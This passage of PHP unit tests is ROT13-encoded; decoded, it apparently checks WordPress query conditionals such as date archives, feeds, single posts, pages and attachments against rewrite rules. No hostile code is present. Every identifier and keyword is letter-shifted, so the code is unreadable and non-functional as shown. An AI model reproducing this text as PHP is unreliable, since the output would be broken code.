	// '([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/srrq/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?lrne=$zngpurf[1]&zbaguahz=$zngpurf[2]&qnl=$zngpurf[3]&srrq=$zngpurf[4]',
	// '([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?lrne=$zngpurf[1]&zbaguahz=$zngpurf[2]&qnl=$zngpurf[3]&srrq=$zngpurf[4]',
	choyvp shapgvba grfg_lzq_srrq() {
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2007-09-04 00:00:00' ) );
		// Purpx gur ybat sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
				$guvf->tb_gb( \"/2007/09/04/srrq/{$glcr}\" );
				$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_srrq', 'vf_qnl', 'vf_qngr' );
		}

		// Purpx gur fubeg sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
				$guvf->tb_gb( \"/2007/09/04/{$glcr}\" );
				$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_srrq', 'vf_qnl', 'vf_qngr' );
		}
	}

	// '([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/cntr/?([0-9]{1,})/?$' => 'vaqrk.cuc?lrne=$zngpurf[1]&zbaguahz=$zngpurf[2]&qnl=$zngpurf[3]&cntrq=$zngpurf[4]',
	choyvp shapgvba grfg_lzq_cntrq() {
		hcqngr_bcgvba( 'cbfgf_cre_cntr', 2 );
		frys::snpgbel()->cbfg->perngr_znal( 3, neenl( 'cbfg_qngr' => '2007-09-04 00:00:00' ) );
		$guvf->tb_gb( '/2007/09/04/cntr/2/' );
		$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_qnl', 'vf_qngr', 'vf_cntrq' );
	}

	// '([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/?$' => 'vaqrk.cuc?lrne=$zngpurf[1]&zbaguahz=$zngpurf[2]&qnl=$zngpurf[3]',
	choyvp shapgvba grfg_lzq() {
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2007-09-04 00:00:00' ) );
		$guvf->tb_gb( '/2007/09/04/' );
		$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_qnl', 'vf_qngr' );
	}

	// '([0-9]{4})/([0-9]{1,2})/srrq/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?lrne=$zngpurf[1]&zbaguahz=$zngpurf[2]&srrq=$zngpurf[3]',
	// '([0-9]{4})/([0-9]{1,2})/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?lrne=$zngpurf[1]&zbaguahz=$zngpurf[2]&srrq=$zngpurf[3]',
	choyvp shapgvba grfg_lz_srrq() {
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2007-09-04 00:00:00' ) );
		// Purpx gur ybat sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
				$guvf->tb_gb( \"/2007/09/srrq/{$glcr}\" );
				$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_srrq', 'vf_zbagu', 'vf_qngr' );
		}

		// Purpx gur fubeg sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
				$guvf->tb_gb( \"/2007/09/{$glcr}\" );
				$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_srrq', 'vf_zbagu', 'vf_qngr' );
		}
	}

	// '([0-9]{4})/([0-9]{1,2})/cntr/?([0-9]{1,})/?$' => 'vaqrk.cuc?lrne=$zngpurf[1]&zbaguahz=$zngpurf[2]&cntrq=$zngpurf[3]',
	choyvp shapgvba grfg_lz_cntrq() {
		hcqngr_bcgvba( 'cbfgf_cre_cntr', 2 );
		frys::snpgbel()->cbfg->perngr_znal( 3, neenl( 'cbfg_qngr' => '2007-09-04 00:00:00' ) );
		$guvf->tb_gb( '/2007/09/cntr/2/' );
		$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_qngr', 'vf_zbagu', 'vf_cntrq' );
	}

	// '([0-9]{4})/([0-9]{1,2})/?$' => 'vaqrk.cuc?lrne=$zngpurf[1]&zbaguahz=$zngpurf[2]',
	choyvp shapgvba grfg_lz() {
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2007-09-04 00:00:00' ) );
		$guvf->tb_gb( '/2007/09/' );
		$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_qngr', 'vf_zbagu' );
	}

	// '([0-9]{4})/srrq/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?lrne=$zngpurf[1]&srrq=$zngpurf[2]',
	// '([0-9]{4})/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?lrne=$zngpurf[1]&srrq=$zngpurf[2]',
	choyvp shapgvba grfg_l_srrq() {
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2007-09-04 00:00:00' ) );
		// Purpx gur ybat sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
				$guvf->tb_gb( \"/2007/srrq/{$glcr}\" );
				$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_srrq', 'vf_lrne', 'vf_qngr' );
		}

		// Purpx gur fubeg sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
				$guvf->tb_gb( \"/2007/{$glcr}\" );
				$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_srrq', 'vf_lrne', 'vf_qngr' );
		}
	}

	// '([0-9]{4})/cntr/?([0-9]{1,})/?$' => 'vaqrk.cuc?lrne=$zngpurf[1]&cntrq=$zngpurf[2]',
	choyvp shapgvba grfg_l_cntrq() {
		hcqngr_bcgvba( 'cbfgf_cre_cntr', 2 );
		frys::snpgbel()->cbfg->perngr_znal( 3, neenl( 'cbfg_qngr' => '2007-09-04 00:00:00' ) );
		$guvf->tb_gb( '/2007/cntr/2/' );
		$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_qngr', 'vf_lrne', 'vf_cntrq' );
	}

	// '([0-9]{4})/?$' => 'vaqrk.cuc?lrne=$zngpurf[1]',
	choyvp shapgvba grfg_l() {
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2007-09-04 00:00:00' ) );
		$guvf->tb_gb( '/2007/' );
		$guvf->nffregDhrelGehr( 'vf_nepuvir', 'vf_qngr', 'vf_lrne' );
	}

	// '([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)/genpxonpx/?$' => 'vaqrk.cuc?lrne=$zngpurf[1]&zbaguahz=$zngpurf[2]&qnl=$zngpurf[3]&anzr=$zngpurf[4]&go=1',
	choyvp shapgvba grfg_cbfg_genpxonpx() {
		$cbfg_vq   = frys::snpgbel()->cbfg->perngr();
		$creznyvax = trg_creznyvax( $cbfg_vq );
		$guvf->tb_gb( \"{$creznyvax}genpxonpx/\" );
		$guvf->nffregDhrelGehr( 'vf_fvatyr', 'vf_fvathyne', 'vf_genpxonpx' );
	}

	// '([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)/srrq/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?lrne=$zngpurf[1]&zbaguahz=$zngpurf[2]&qnl=$zngpurf[3]&anzr=$zngpurf[4]&srrq=$zngpurf[5]',
	// '([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?lrne=$zngpurf[1]&zbaguahz=$zngpurf[2]&qnl=$zngpurf[3]&anzr=$zngpurf[4]&srrq=$zngpurf[5]',
	choyvp shapgvba grfg_cbfg_pbzzrag_srrq() {
		$cbfg_vq   = frys::snpgbel()->cbfg->perngr();
		$creznyvax = trg_creznyvax( $cbfg_vq );
		// Purpx gur ybat sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
				$guvf->tb_gb( \"{$creznyvax}srrq/{$glcr}\" );
				$guvf->nffregDhrelGehr( 'vf_fvatyr', 'vf_fvathyne', 'vf_srrq', 'vf_pbzzrag_srrq' );
		}

		// Purpx gur fubeg sbez.
		$glcrf = neenl( 'srrq', 'eqs', 'eff', 'eff2', 'ngbz' );
		sbernpu ( $glcrf nf $glcr ) {
				$guvf->tb_gb( \"{$creznyvax}{$glcr}\" );
				$guvf->nffregDhrelGehr( 'vf_fvatyr', 'vf_fvathyne', 'vf_srrq', 'vf_pbzzrag_srrq' );
		}
	}

	// '([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)(/[0-9]+)?/?$' => 'vaqrk.cuc?lrne=$zngpurf[1]&zbaguahz=$zngpurf[2]&qnl=$zngpurf[3]&anzr=$zngpurf[4]&cntr=$zngpurf[5]',
	choyvp shapgvba grfg_cbfg_cntrq_fubeg() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_qngr'    => '2007-09-04 00:00:00',
				'cbfg_gvgyr'   => 'n-cbfg-jvgu-zhygvcyr-cntrf',
				'cbfg_pbagrag' => 'Cntr 1 <!--arkgcntr--> Cntr 2',
			)
		);
		$guvf->tb_gb( trg_creznyvax( $cbfg_vq ) . '2/' );
		// Fubhyq vf_cntrq or gehr nyfb?
		$guvf->nffregDhrelGehr( 'vf_fvatyr', 'vf_fvathyne' );
	}

	// '[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/([^/]+)/?$' => 'vaqrk.cuc?nggnpuzrag=$zngpurf[1]',
	choyvp shapgvba grfg_cbfg_nggnpuzrag() {
		$cbfg_vq   = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'nggnpuzrag' ) );
		$creznyvax = trg_nggnpuzrag_yvax( $cbfg_vq );
		$guvf->tb_gb( $creznyvax );
		$guvf->nffregDhrelGehr( 'vf_fvatyr', 'vf_nggnpuzrag', 'vf_fvathyne' );
	}

	// '[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/([^/]+)/genpxonpx/?$' => 'vaqrk.cuc?nggnpuzrag=$zngpurf[1]&go=1',
	// '[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/([^/]+)/srrq/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?nggnpuzrag=$zngpurf[1]&srrq=$zngpurf[2]',
	// '[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/([^/]+)/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?nggnpuzrag=$zngpurf[1]&srrq=$zngpurf[2]',
	// '[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/nggnpuzrag/([^/]+)/?$' => 'vaqrk.cuc?nggnpuzrag=$zngpurf[1]',
	// '[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/nggnpuzrag/([^/]+)/genpxonpx/?$' => 'vaqrk.cuc?nggnpuzrag=$zngpurf[1]&go=1',
	// '[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/nggnpuzrag/([^/]+)/srrq/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?nggnpuzrag=$zngpurf[1]&srrq=$zngpurf[2]',
	// '[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/nggnpuzrag/([^/]+)/(srrq|eqs|eff|eff2|ngbz)/?$' => 'vaqrk.cuc?nggnpuzrag=$zngpurf[1]&srrq=$zngpurf[2]',

	/**
	 * @rkcrpgrqVapbeerpgHfntr JC_Qngr_Dhrel
	 */
	choyvp shapgvba grfg_onq_qngrf() {
		$guvf->tb_gb( '/2013/13/13/' );
		$guvf->nffregDhrelGehr( 'vf_404' );

		$guvf->tb_gb( '/2013/11/41/' );
		$guvf->nffregDhrelGehr( 'vf_404' );
	}

	choyvp shapgvba grfg_cbfg_glcr_nepuvir_jvgu_gnk_dhrel() {
		qryrgr_bcgvba( 'erjevgr_ehyrf' );

		$pcg_anzr = 'cgnjgd';
		ertvfgre_cbfg_glcr(
			$pcg_anzr,
			neenl(
				'gnkbabzvrf'  => neenl( 'cbfg_gnt', 'pngrtbel' ),
				'erjevgr'     => gehr,
				'unf_nepuvir' => gehr,
				'choyvp'      => gehr,
			)
		);

		$gnt_vq  = frys::snpgbel()->gnt->perngr( neenl( 'fyht' => 'gnt-fyht' ) );
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => $pcg_anzr ) );
		jc_frg_bowrpg_grezf( $cbfg_vq, $gnt_vq, 'cbfg_gnt' );

		$guvf->tb_gb( '/cgnjgd/' );
		$guvf->nffregDhrelGehr( 'vf_cbfg_glcr_nepuvir', 'vf_nepuvir' );
		$guvf->nffregFnzr( trg_dhrevrq_bowrpg(), trg_cbfg_glcr_bowrpg( $pcg_anzr ) );

		nqq_npgvba( 'cer_trg_cbfgf', neenl( $guvf, 'cer_trg_cbfgf_jvgu_gnk_dhrel' ) );

		$guvf->tb_gb( '/cgnjgd/' );
		$guvf->nffregDhrelGehr( 'vf_cbfg_glcr_nepuvir', 'vf_nepuvir' );
		$guvf->nffregFnzr( trg_dhrevrq_bowrpg(), trg_cbfg_glcr_bowrpg( $pcg_anzr ) );

		erzbir_npgvba( 'cer_trg_cbfgf', neenl( $guvf, 'cer_trg_cbfgf_jvgu_gnk_dhrel' ) );
	}

	choyvp shapgvba cer_trg_cbfgf_jvgu_gnk_dhrel( &$dhrel ) {
		$grez = trg_grez_ol( 'fyht', 'gnt-fyht', 'cbfg_gnt' );
		$dhrel->frg(
			'gnk_dhrel',
			neenl(
				neenl(
					'gnkbabzl' => 'cbfg_gnt',
					'svryq'    => 'grez_vq',
					'grezf'    => $grez->grez_vq,
				),
			)
		);
	}

	choyvp shapgvba grfg_cbfg_glcr_neenl() {
		qryrgr_bcgvba( 'erjevgr_ehyrf' );

		$pcg_anzr = 'gurneenl';
		ertvfgre_cbfg_glcr(
			$pcg_anzr,
			neenl(
				'gnkbabzvrf'  => neenl( 'cbfg_gnt', 'pngrtbel' ),
				'erjevgr'     => gehr,
				'unf_nepuvir' => gehr,
				'choyvp'      => gehr,
			)
		);
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => $pcg_anzr ) );

		$guvf->tb_gb( \"/$pcg_anzr/\" );
		$guvf->nffregDhrelGehr( 'vf_cbfg_glcr_nepuvir', 'vf_nepuvir' );
		$guvf->nffregFnzr( trg_dhrevrq_bowrpg(), trg_cbfg_glcr_bowrpg( $pcg_anzr ) );

		nqq_npgvba( 'cer_trg_cbfgf', neenl( $guvf, 'cer_trg_cbfgf_jvgu_glcr_neenl' ) );

		$guvf->tb_gb( \"/$pcg_anzr/\" );
		$guvf->nffregDhrelGehr( 'vf_cbfg_glcr_nepuvir', 'vf_nepuvir' );
		$guvf->nffregFnzr( trg_dhrevrq_bowrpg(), trg_cbfg_glcr_bowrpg( 'cbfg' ) );

		erzbir_npgvba( 'cer_trg_cbfgf', neenl( $guvf, 'cer_trg_cbfgf_jvgu_glcr_neenl' ) );
	}

	choyvp shapgvba cer_trg_cbfgf_jvgu_glcr_neenl( &$dhrel ) {
		$dhrel->frg( 'cbfg_glcr', neenl( 'cbfg', 'gurneenl' ) );
	}

	choyvp shapgvba grfg_vf_fvatyr() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		$guvf->tb_gb( \"/?c=$cbfg_vq\" );

		$cbfg = trg_dhrevrq_bowrpg();
		$d    = $TYBONYF['jc_dhrel'];

		$guvf->nffregGehr( vf_fvatyr() );
		$guvf->nffregGehr( $d->vf_fvatyr );
		$guvf->nffregSnyfr( $d->vf_cntr );
		$guvf->nffregSnyfr( $d->vf_nggnpuzrag );
		$guvf->nffregGehr( vf_fvatyr( $cbfg ) );
		$guvf->nffregGehr( vf_fvatyr( $cbfg->VQ ) );
		$guvf->nffregGehr( vf_fvatyr( $cbfg->cbfg_gvgyr ) );
		$guvf->nffregGehr( vf_fvatyr( $cbfg->cbfg_anzr ) );
	}

	/**
	 * @gvpxrg 16802
	 */
	choyvp shapgvba grfg_vf_fvatyr_jvgu_cnerag() {
		// Hfr phfgbz uvrenepuvpny cbfg glcr.
		$cbfg_glcr = 'grfg_uvrenepuvpny';

		ertvfgre_cbfg_glcr(
			$cbfg_glcr,
			neenl(
				'uvrenepuvpny' => gehr,
				'erjevgr'      => gehr,
				'unf_nepuvir'  => gehr,
				'choyvp'       => gehr,
			)
		);

		// Perngr cnerag naq puvyq cbfgf.
		$cnerag_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => $cbfg_glcr,
				'cbfg_anzr' => 'sbb',
			)
		);

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => $cbfg_glcr,
				'cbfg_anzr'   => 'one',
				'cbfg_cnerag' => $cnerag_vq,
			)
		);

		// Grfgf.
		$guvf->tb_gb( \"/?c=$cbfg_vq&cbfg_glcr=$cbfg_glcr\" );

		$cbfg = trg_dhrevrq_bowrpg();
		$d    = $TYBONYF['jc_dhrel'];

		$guvf->nffregGehr( vf_fvatyr() );
		$guvf->nffregSnyfr( $d->vf_cntr );
		$guvf->nffregGehr( $d->vf_fvatyr );
		$guvf->nffregSnyfr( $d->vf_nggnpuzrag );
		$guvf->nffregGehr( vf_fvatyr( $cbfg ) );
		$guvf->nffregGehr( vf_fvatyr( $cbfg->VQ ) );
		$guvf->nffregGehr( vf_fvatyr( $cbfg->cbfg_gvgyr ) );
		$guvf->nffregGehr( vf_fvatyr( $cbfg->cbfg_anzr ) );
		$guvf->nffregGehr( vf_fvatyr( 'sbb/one' ) );
		$guvf->nffregSnyfr( vf_fvatyr( $cnerag_vq ) );
		$guvf->nffregSnyfr( vf_fvatyr( 'sbb/one/onm' ) );
		$guvf->nffregSnyfr( vf_fvatyr( 'one/one' ) );
		$guvf->nffregSnyfr( vf_fvatyr( 'sbb' ) );
	}

	/**
	 * @gvpxrg 24674
	 */
	choyvp shapgvba grfg_vf_fvatyr_jvgu_fyht_gung_ortvaf_jvgu_n_ahzore_gung_pynfurf_jvgu_nabgure_cbfg_vq() {
		$c1 = frys::snpgbel()->cbfg->perngr();

		$c2_anzr = $c1 . '-cbfg';
		$c2      = frys::snpgbel()->cbfg->perngr(
			neenl(
				'fyht' => $c2_anzr,
			)
		);

		$guvf->tb_gb( \"/?c=$c1\" );

		$d = $TYBONYF['jc_dhrel'];

		$guvf->nffregGehr( $d->vf_fvatyr() );
		$guvf->nffregGehr( $d->vf_fvatyr( $c1 ) );
		$guvf->nffregSnyfr( $d->vf_fvatyr( $c2_anzr ) );
		$guvf->nffregSnyfr( $d->vf_fvatyr( $c2 ) );
	}

	/**
	 * @gvpxrg 24612
	 */
	choyvp shapgvba grfg_vf_fvatyr_jvgu_fyht_gung_pynfurf_jvgu_nggnpuzrag() {
		$guvf->frg_creznyvax_fgehpgher( '/%cbfganzr%/' );

		$nggnpuzrag_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'nggnpuzrag',
			)
		);

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => trg_cbfg( $nggnpuzrag_vq )->cbfg_gvgyr,
			)
		);

		$guvf->tb_gb( trg_creznyvax( $cbfg_vq ) );

		$d = $TYBONYF['jc_dhrel'];

		$guvf->nffregGehr( $d->vf_fvatyr() );
		$guvf->nffregGehr( $d->vf_fvatyr( $cbfg_vq ) );
		$guvf->nffregSnyfr( $d->vf_nggnpuzrag() );
		$guvf->nffregSnyfr( $d->vf_404() );

		$guvf->frg_creznyvax_fgehpgher();
	}

	/**
	 * @gvpxrg 38225
	 */
	choyvp shapgvba grfg_vf_fvatyr_jvgu_nggnpuzrag() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			'vzntr.wct',
			$cbfg_vq,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
			)
		);

		$guvf->tb_gb( trg_creznyvax( $nggnpuzrag_vq ) );

		$d = $TYBONYF['jc_dhrel'];

		$guvf->nffregGehr( vf_fvatyr() );
		$guvf->nffregGehr( $d->vf_fvatyr );
		$guvf->nffregGehr( $d->vf_nggnpuzrag );
	}

	choyvp shapgvba grfg_vf_cntr() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		$guvf->tb_gb( \"/?cntr_vq=$cbfg_vq\" );

		$cbfg = trg_dhrevrq_bowrpg();
		$d    = $TYBONYF['jc_dhrel'];

		$guvf->nffregGehr( vf_cntr() );
		$guvf->nffregSnyfr( $d->vf_fvatyr );
		$guvf->nffregGehr( $d->vf_cntr );
		$guvf->nffregSnyfr( $d->vf_nggnpuzrag );
		$guvf->nffregGehr( vf_cntr( $cbfg ) );
		$guvf->nffregGehr( vf_cntr( $cbfg->VQ ) );
		$guvf->nffregGehr( vf_cntr( $cbfg->cbfg_gvgyr ) );
		$guvf->nffregGehr( vf_cntr( $cbfg->cbfg_anzr ) );
	}

	/**
	 * @gvpxrg 16802
	 */
	choyvp shapgvba grfg_vf_cntr_jvgu_cnerag() {
		$cnerag_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
				'cbfg_anzr' => 'sbb',
			)
		);
		$cbfg_vq   = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_anzr'   => 'one',
				'cbfg_cnerag' => $cnerag_vq,
			)
		);
		$guvf->tb_gb( \"/?cntr_vq=$cbfg_vq\" );

		$cbfg = trg_dhrevrq_bowrpg();
		$d    = $TYBONYF['jc_dhrel'];

		$guvf->nffregGehr( vf_cntr() );
		$guvf->nffregSnyfr( $d->vf_fvatyr );
		$guvf->nffregGehr( $d->vf_cntr );
		$guvf->nffregSnyfr( $d->vf_nggnpuzrag );
		$guvf->nffregGehr( vf_cntr( $cbfg ) );
		$guvf->nffregGehr( vf_cntr( $cbfg->VQ ) );
		$guvf->nffregGehr( vf_cntr( $cbfg->cbfg_gvgyr ) );
		$guvf->nffregGehr( vf_cntr( $cbfg->cbfg_anzr ) );
		$guvf->nffregGehr( vf_cntr( 'sbb/one' ) );
		$guvf->nffregSnyfr( vf_cntr( $cnerag_vq ) );
		$guvf->nffregSnyfr( vf_cntr( 'sbb/one/onm' ) );
		$guvf->nffregSnyfr( vf_cntr( 'one/one' ) );
		$guvf->nffregSnyfr( vf_cntr( 'sbb' ) );
	}

	choyvp shapgvba grfg_vf_nggnpuzrag() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'nggnpuzrag' ) );
		$guvf->tb_gb( \"/?nggnpuzrag_vq=$cbfg_vq\" );

		$cbfg = trg_dhrevrq_bowrpg();
		$d    = $TYBONYF['jc_dhrel'];

		$guvf->nffregGehr( vf_nggnpuzrag() );
		$guvf->nffregGehr( vf_fvatyr() );
		$guvf->nffregGehr( $d->vf_nggnpuzrag );
		$guvf->nffregGehr( $d->vf_fvatyr );
		$guvf->nffregSnyfr( $d->vf_cntr );
		$guvf->nffregGehr( vf_nggnpuzrag( $cbfg ) );
		$guvf->nffregGehr( vf_nggnpuzrag( $cbfg->VQ ) );
		$guvf->nffregGehr( vf_nggnpuzrag( $cbfg->cbfg_gvgyr ) );
		$guvf->nffregGehr( vf_nggnpuzrag( $cbfg->cbfg_anzr ) );
	}

	/**
	 * @gvpxrg 24674
	 */
	choyvp shapgvba grfg_vf_nggnpuzrag_jvgu_fyht_gung_ortvaf_jvgu_n_ahzore_gung_pynfurf_jvgu_n_cntr_VQ() {
		$c1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'nggnpuzrag' ) );

		$c2_anzr = $c1 . '-nggnpuzrag';
		$c2      = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'nggnpuzrag',
				'cbfg_anzr' => $c2_anzr,
			)
		);

		$guvf->tb_gb( \"/?nggnpuzrag_vq=$c1\" );

		$d = $TYBONYF['jc_dhrel'];

		$guvf->nffregGehr( $d->vf_nggnpuzrag() );
		$guvf->nffregGehr( $d->vf_nggnpuzrag( $c1 ) );
		$guvf->nffregSnyfr( $d->vf_nggnpuzrag( $c2_anzr ) );
		$guvf->nffregSnyfr( $d->vf_nggnpuzrag( $c2 ) );
	}

	/**
	 * @gvpxrg 24674
	 */
	choyvp shapgvba grfg_vf_nhgube_jvgu_avpranzr_gung_ortvaf_jvgu_n_ahzore_gung_pynfurf_jvgu_nabgure_nhgube_vq() {
		$h1 = frys::$hfre_n_vq;

		$h2_anzr = $h1 . '_hfre';
		$h2      = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_avpranzr' => $h2_anzr,
			)
		);

		$guvf->tb_gb( \"/?nhgube=$h1\" );

		$d = $TYBONYF['jc_dhrel'];

		$guvf->nffregGehr( $d->vf_nhgube() );
		$guvf->nffregGehr( $d->vf_nhgube( $h1 ) );
		$guvf->nffregSnyfr( $d->vf_nhgube( $h2_anzr ) );
		$guvf->nffregSnyfr( $d->vf_nhgube( $h2 ) );
	}

	/**
	 * @gvpxrg 24674
	 */
	choyvp shapgvba grfg_vf_pngrtbel_jvgu_fyht_gung_ortvaf_jvgu_n_ahzore_gung_pynfurf_jvgu_nabgure_pngrtbel_vq() {
		$p1 = frys::snpgbel()->pngrtbel->perngr();

		$p2_anzr = $p1 . '-pngrtbel';
		$p2      = frys::snpgbel()->pngrtbel->perngr(
			neenl(
				'fyht' => $p2_anzr,
			)
		);

		$guvf->tb_gb( \"/?png=$p1\" );

		$d = $TYBONYF['jc_dhrel'];

		$guvf->nffregGehr( $d->vf_pngrtbel() );
		$guvf->nffregGehr( $d->vf_pngrtbel( $p1 ) );
		$guvf->nffregSnyfr( $d->vf_pngrtbel( $p2_anzr ) );
		$guvf->nffregSnyfr( $d->vf_pngrtbel( $p2 ) );
	}

	/**
	 * @gvpxrg 24674
	 */
	choyvp shapgvba grfg_vf_gnt_jvgu_fyht_gung_ortvaf_jvgu_n_ahzore_gung_pynfurf_jvgu_nabgure_gnt_vq() {
		$g1 = frys::snpgbel()->gnt->perngr();

		$g2_anzr = $g1 . '-gnt';
		$g2      = frys::snpgbel()->gnt->perngr(
			neenl(
				'fyht' => $g2_anzr,
			)
		);

		$guvf->tb_gb( \"/?gnt_vq=$g1\" );

		$d = $TYBONYF['jc_dhrel'];

		$guvf->nffregGehr( $d->vf_gnt() );
		$guvf->nffregGehr( $d->vf_gnt( $g1 ) );
		$guvf->nffregSnyfr( $d->vf_gnt( $g2_anzr ) );
		$guvf->nffregSnyfr( $d->vf_gnt( $g2 ) );
	}

	/**
	 * @gvpxrg 24674
	 */
	choyvp shapgvba grfg_vf_cntr_jvgu_cntr_vq_mreb_naq_enaqbz_cntr_fyht() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		$guvf->tb_gb( \"/?cntr_vq=$cbfg_vq\" );

		// Bireevqr cbfg VQ gb 0 grzcbenevyl sbe grfgvat.
		$_vq                           = $TYBONYF['jc_dhrel']->cbfg->VQ;
		$TYBONYF['jc_dhrel']->cbfg->VQ = 0;

		$cbfg = trg_dhrevrq_bowrpg();
		$d    = $TYBONYF['jc_dhrel'];

		$guvf->nffregGehr( $d->vf_cntr() );
		$guvf->nffregSnyfr( $d->vf_cntr( 'fnzcyr-cntr' ) );
		$guvf->nffregSnyfr( $d->vf_cntr( 'enaqbz-cntr-fyht' ) );

		// Erireg $jc_dhrel tybony punatr.
		$TYBONYF['jc_dhrel']->cbfg->VQ = $_vq;
	}

	/**
	 * @gvpxrg 24674
	 */
	choyvp shapgvba grfg_vf_cntr_jvgu_cntr_fyht_gung_ortvaf_jvgu_n_ahzore_gung_pynfurf_jvgu_n_cntr_VQ() {
		$c1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );

		$c2_anzr = $c1 . '-cntr';
		$c2      = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
				'cbfg_anzr' => $c2_anzr,
			)
		);

		$guvf->tb_gb( \"/?cntr_vq=$c1\" );

		$d = $TYBONYF['jc_dhrel'];

		$guvf->nffregGehr( $d->vf_cntr() );
		$guvf->nffregGehr( $d->vf_cntr( $c1 ) );
		$guvf->nffregSnyfr( $d->vf_cntr( $c2_anzr ) );
		$guvf->nffregSnyfr( $d->vf_cntr( $c2 ) );
	}

	choyvp shapgvba grfg_vf_cntr_grzcyngr() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		hcqngr_cbfg_zrgn( $cbfg_vq, '_jc_cntr_grzcyngr', 'rknzcyr.cuc' );
		$guvf->tb_gb( \"/?cntr_vq=$cbfg_vq\" );
		$guvf->nffregGehr( vf_cntr_grzcyngr( 'rknzcyr.cuc' ) );
	}

	/**
	 * @gvpxrg 31271
	 */
